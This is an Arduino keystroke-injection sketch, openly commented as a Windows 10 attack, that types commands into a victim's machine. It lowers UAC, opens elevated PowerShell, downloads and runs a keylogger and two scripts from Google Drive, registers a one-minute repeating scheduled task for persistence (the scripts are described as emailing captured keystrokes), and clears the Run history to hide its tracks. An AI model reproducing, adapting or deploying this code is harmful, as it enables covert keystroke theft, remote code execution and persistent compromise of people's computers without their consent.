//Author: Usama Sadiq
//Target: Windows 10
//Description: Bypassing uac. Then download the logger.exe and 2 script files. Then runs logger.exe. creates a task schedule which runs 2 powershell script.
// logger.exe is a keylogger i wrote using pynput library for python.
// generated logger.exe using pyinstaller library
// 2 powershell script are responsible for stopping the logger.exe. send an email with an attachment of Key_log.txt and delete this file and start logger.exe again
// delete the windows run history to cover our tracks


#include<Keyboard.h>

void setup() {
  // initialize control over the keyboard:
    Keyboard.begin();
    delay(1000);

    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('d');
    Keyboard.releaseAll();
    delay(100);
    
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(100);
    
    Keyboard.print("cmd");
    delay(200);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(350);

    Keyboard.print("mode con:cols=18 lines=1");
    delay(100);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    
    delay(100);

    Keyboard.print("color FE");
    delay(100);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(100);

    Keyboard.print("C:\\Windows\\System32\\UserAccountControlSettings.exe");
    delay(100);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(500);

    Keyboard.press(KEY_TAB);
    Keyboard.releaseAll();
    delay(100);

    Keyboard.press(KEY_DOWN_ARROW);
    Keyboard.releaseAll();

    delay(100);

    Keyboard.press(KEY_DOWN_ARROW);
    Keyboard.releaseAll();

    delay(350);

    Keyboard.press(KEY_TAB);
    Keyboard.releaseAll();

    delay(100);
    
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();

    delay(600);

    Keyboard.press(KEY_LEFT_ARROW);
    Keyboard.releaseAll();

    delay(100);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();

    delay(200);

    Keyboard.print("exit");
    delay(100);
    
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();

    delay(200);
    
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(200);
    
    Keyboard.print("powershell Start-Process powershell -Verb runAs");
    delay(200);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(1000);

    Keyboard.print("cd $env:USERPROFILE");
    delay(200);
    
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(200);

    Keyboard.print("$url = \"https://drive.google.com/u/0/uc?id=1INO_wa_9cSoJHYvtee-Y1SoQqY7IKq7l&export=download\";$dest = echo $env:USERPROFILE\\logger.exe;(new-object System.Net.WebClient).DownloadFile($url,$dest);");
    delay(200);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(600);
    
    Keyboard.print(".\\logger.exe");
    delay(200);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(200);

    Keyboard.print("$url = \"https://drive.google.com/u/0/uc?id=1qX_GQxd_zkgdjCbsP-avVBgOmL0700zD&export=download\";$dest = echo $env:USERPROFILE\\runlogger.ps1;(new-object System.Net.WebClient).DownloadFile($url,$dest);");
    delay(200);
    
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(600);
    
    Keyboard.print("$url = \"https://drive.google.com/u/0/uc?id=1RSMWEsJteyf3VTnywBEEOW4PrQDf0VFS&export=download\";$dest = echo $env:USERPROFILE\\runlogger1.ps1;(new-object System.Net.WebClient).DownloadFile($url,$dest)");
    delay(200);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(600);
    
    Keyboard.print("$path = echo $env:USERPROFILE\\runlogger.ps1");
    delay(200);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(200);
    
    Keyboard.print("$action = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"Start-Process powershell.exe $path -Verb runAs\"");
    delay(300);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(200);

    Keyboard.print("$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DisallowDemandStart -DisallowHardTerminate -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -StartWhenAvailable");
    delay(300);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(200);

    Keyboard.print("$timespan = New-TimeSpan -Minutes 1");
    delay(200);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(200);

    Keyboard.print("$date = Get-Date -Format \"MM/dd/yy HH:mm\"");
    delay(300);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(200);

    Keyboard.print("$trigger = New-ScheduledTaskTrigger -At $date -Once -RepetitionInterval $timespan");
    delay(300);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(300);

    Keyboard.print("Register-ScheduledTask -TaskName \"TempFuntest\" -Action $action -Settings $settings -Trigger $trigger");
    delay(300);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(400);
    
    Keyboard.print("powershell \"Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name '*' -ErrorAction SilentlyContinue\"");
    delay(400);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();

    delay(400);

    Keyboard.print("exit");
    delay(100);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    
}

void loop() {
  // put your main code here, to run repeatedly:
  }
